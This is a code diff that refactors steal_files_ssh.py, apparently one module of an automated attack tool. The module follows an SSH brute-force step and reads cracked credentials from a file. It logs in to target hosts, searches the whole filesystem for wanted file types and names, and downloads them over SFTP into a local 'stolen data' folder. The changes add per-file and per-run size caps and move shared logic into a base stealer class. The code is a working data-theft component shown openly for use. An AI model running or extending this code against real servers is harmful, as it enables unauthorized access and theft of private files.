@@ -1,15 +1,18 @@
 """
-steal_files_ssh.py - This script connects to remote SSH servers using provided credentials, searches for specific files, and downloads them to a local directory.
+steal_files_ssh.py - Connects to remote SSH servers with cracked credentials, finds files matching
+the steal_file_* config, and downloads them over SFTP.
+
+#12: the scaffolding (parent gate, latch reset, credential load, watchdog timer, credential loop,
+outcome contract) lives in base_stealer.BaseStealer. This file is the SSH adapter.
 """
 
+import logging
 import os
 import paramiko
-import logging
-import time
-from rich.console import Console
-from threading import Timer
-from shared import SharedData, settle_for_display
+
+from base_stealer import BaseStealer, MAX_FILE_BYTES
 from logger import Logger
+from shared import SharedData
 
 # Configure the logger
 logger = Logger(name="steal_files_ssh.py", level=logging.DEBUG)
@@ -21,167 +24,80 @@ b_status = "steal_files_ssh"
 b_parent = "SSHBruteforce"
 b_port = 22
 
-class StealFilesSSH:
-    """
-    Class to handle the process of stealing files from SSH servers.
-    """
-    def __init__(self, shared_data):
-        try:
-            self.shared_data = shared_data
-            self.sftp_connected = False
-            self.stop_execution = False
-            logger.info("StealFilesSSH initialized")
-        except Exception as e:
-            logger.error(f"Error during initialization: {e}")
 
-    def connect_ssh(self, ip, username, password):
-        """
-        Establish an SSH connection.
-        """
-        try:
-            ssh = paramiko.SSHClient()
-            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-            # Wall-clock bounds so a black-holed host can't hang the steal worker
-            # (banner_timeout alone leaves TCP connect and auth able to stall).
-            ssh.connect(ip, username=username, password=password,
-                        timeout=10, banner_timeout=10, auth_timeout=10)
-            logger.info(f"Connected to {ip} via SSH with username {username}")
-            return ssh
-        except Exception as e:
-            logger.error(f"Error connecting to SSH on {ip} with username {username}: {e}")
-            raise
+class StealFilesSSH(BaseStealer):
+    """Steal files from SSH servers over SFTP."""
 
-    def find_files(self, ssh, dir_path):
-        """
-        Find files in the remote directory based on the configuration criteria.
-        """
-        try:
-            stdin, stdout, stderr = ssh.exec_command(f'find {dir_path} -type f')
-            files = stdout.read().decode().splitlines()
-            matching_files = []
-            for file in files:
-                if self.shared_data.orchestrator_should_exit :
-                    logger.info("File search interrupted.")
-                    return []
-                if any(file.endswith(ext) for ext in self.shared_data.steal_file_extensions) or \
-                   any(file_name in file for file_name in self.shared_data.steal_file_names):
-                    matching_files.append(file)
-            logger.info(f"Found {len(matching_files)} matching files in {dir_path}")
-            return matching_files
-        except Exception as e:
-            logger.error(f"Error finding files in directory {dir_path}: {e}")
-            raise
+    CRED_FILE_ATTR = "sshfile"
+    LOOT_SUBDIR = "ssh"
+    CONNECTED_FLAG = "sftp_connected"
+    LOGGER = logger
 
-    def steal_file(self, ssh, remote_file, local_dir):
+    def open_session(self, ip, username, password):
+        ssh = paramiko.SSHClient()
+        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+        # Wall-clock bounds so a black-holed host can't hang the steal worker
+        # (banner_timeout alone leaves TCP connect and auth able to stall).
+        ssh.connect(ip, username=username, password=password,
+                    timeout=10, banner_timeout=10, auth_timeout=10)
+        logger.info(f"Connected to {ip} via SSH with username {username}")
+        return ssh
+
+    def find_files(self, conn, dir_path):
+        _stdin, stdout, _stderr = conn.exec_command(f'find {dir_path} -type f')
+        matching = []
+        for path in stdout.read().decode().splitlines():
+            if self.shared_data.orchestrator_should_exit:
+                logger.info("File search interrupted.")
+                return []
+            if self.matches_wanted(path):
+                matching.append(path)
+        logger.info(f"Found {len(matching)} matching files in {dir_path}")
+        return matching
+
+    def steal_file(self, conn, remote_file, local_dir):
+        """Download one file over SFTP, within the #6 budgets.
+
+        SFTP can stat before transferring, so the size cap is a refusal rather than an abort
+        partway through — no partial file to clean up in the common case, and nothing is pulled
+        over the wire just to be discarded. (The ftp/smb modules cap mid-stream because their
+        transfer APIs hand back chunks without a reliable size up front.)
         """
-        Download a file from the remote server to the local directory.
-        """
+        if not self.check_budget(local_dir):
+            return
+        local_file_path = None
+        sftp = None
         try:
-            sftp = ssh.open_sftp()
-            self.sftp_connected = True  # Mark SFTP as connected
-            remote_dir = os.path.dirname(remote_file)
-            local_file_dir = os.path.join(local_dir, os.path.relpath(remote_dir, '/'))
+            sftp = conn.open_sftp()
+            self.mark_connected()
+            size = sftp.stat(remote_file).st_size
+            if not self.fits_budget(size):
+                logger.warning(
+                    f"Skipping {remote_file}: {size} bytes exceeds the per-file cap "
+                    f"({MAX_FILE_BYTES}) or the remaining per-run budget")
+                return
+            local_file_dir = os.path.join(
+                local_dir, os.path.relpath(os.path.dirname(remote_file), '/'))
             os.makedirs(local_file_dir, exist_ok=True)
             local_file_path = os.path.join(local_file_dir, os.path.basename(remote_file))
             sftp.get(remote_file, local_file_path)
-            logger.success(f"Downloaded file from {remote_file} to {local_file_path}")
-            sftp.close()
+            self.note_bytes(size)
+            logger.success(f"Downloaded file from {remote_file} to {local_file_path} ({size} bytes)")
         except Exception as e:
             logger.error(f"Error stealing file {remote_file}: {e}")
+            try:
+                if local_file_path and os.path.exists(local_file_path):
+                    os.unlink(local_file_path)
+            except OSError:
+                pass
             raise
+        finally:
+            if sftp is not None:
+                try:
+                    sftp.close()
+                except Exception:
+                    pass
 
-    def execute(self, ip, port, row, status_key):
-        """
-        Steal files from the remote server using SSH.
-        """
-        try:
-            if 'success' in row.get(self.b_parent_action, ''):  # Verify if the parent action is successful
-                self.shared_data.bjornorch_status = "StealFilesSSH"
-                # Per-run state, reset here rather than only in __init__. These objects are
-                # long-lived singletons built once by orchestrator.load_action, so the flags
-                # latched: once the 240s timer fired for ANY host, stop_execution stayed True
-                # and every later steal on every host broke out immediately and returned
-                # 'failed' — permanently, until the service restarted. Conversely a single
-                # success left *_connected True and disarmed the timeout for good.
-                self.stop_execution = False
-                self.sftp_connected = False
-                settle_for_display(self.shared_data)  # let the panel show this action's name
-                logger.info(f"Stealing files from {ip}:{port}...")
-
-                # Get SSH credentials from the cracked passwords file
-                sshfile = self.shared_data.sshfile
-                credentials = []
-                if os.path.exists(sshfile):
-                    with open(sshfile, 'r') as f:
-                        lines = f.readlines()[1:]  # Skip the header
-                        for line in lines:
-                            parts = line.strip().split(',')
-                            if parts[1] == ip:
-                                credentials.append((parts[3], parts[4]))
-                    logger.info(f"Found {len(credentials)} credentials for {ip}")
-
-                if not credentials:
-                    logger.error(f"No valid credentials found for {ip}. Skipping...")
-                    return 'failed'
-
-                # Token this run. timer.cancel() is only reached on the success path, so a failed
-                # steal leaves a live 240s timer behind; without this it would fire midway
-                # through a LATER host's steal and abort it by setting stop_execution.
-                run_token = object()
-                self._run_token = run_token
-
-                def timeout():
-                    """
-                    Timeout function to stop the execution if no SFTP connection is established.
-                    """
-                    if getattr(self, '_run_token', None) is not run_token:
-                        return  # a later execute() owns the flags now
-                    if not self.sftp_connected:
-                        logger.error(f"No SFTP connection established within 4 minutes for {ip}. Marking as failed.")
-                        self.stop_execution = True
-
-                timer = Timer(240, timeout)  # 4 minutes timeout
-                timer.daemon = True  # never hold up shutdown waiting for a 4-minute timer
-                timer.start()
-
-                # Attempt to steal files using each credential
-                success = False
-                for username, password in credentials:
-                    if self.stop_execution or self.shared_data.orchestrator_should_exit:
-                        logger.info("File search interrupted.")
-                        break
-                    try:
-                        logger.info(f"Trying credential {username}:{password} for {ip}")
-                        ssh = self.connect_ssh(ip, username, password)
-                        remote_files = self.find_files(ssh, '/')
-                        mac = row['MAC Address']
-                        local_dir = os.path.join(self.shared_data.datastolendir, f"ssh/{mac}_{ip}")
-                        if remote_files:
-                            for remote_file in remote_files:
-                                if self.stop_execution or self.shared_data.orchestrator_should_exit:
-                                    logger.info("File search interrupted.")
-                                    break
-                                self.steal_file(ssh, remote_file, local_dir)
-                            success = True
-                            countfiles = len(remote_files)
-                            logger.success(f"Successfully stolen {countfiles} files from {ip}:{port} using {username}")
-                        ssh.close()
-                        if success:
-                            timer.cancel()  # Cancel the timer if the operation is successful
-                            return 'success'  # Return success if the operation is successful
-                    except Exception as e:
-                        logger.error(f"Error stealing files from {ip} with username {username}: {e}")
-
-                # Ensure the action is marked as failed if no files were found
-                if not success:
-                    logger.error(f"Failed to steal any files from {ip}:{port}")
-                    return 'failed'
-            else:
-                logger.error(f"Parent action not successful for {ip}. Skipping steal files action.")
-                return 'failed'
-        except Exception as e:
-            logger.error(f"Unexpected error during execution for {ip}:{port}: {e}")
-            return 'failed'
 
 if __name__ == "__main__":
     try:
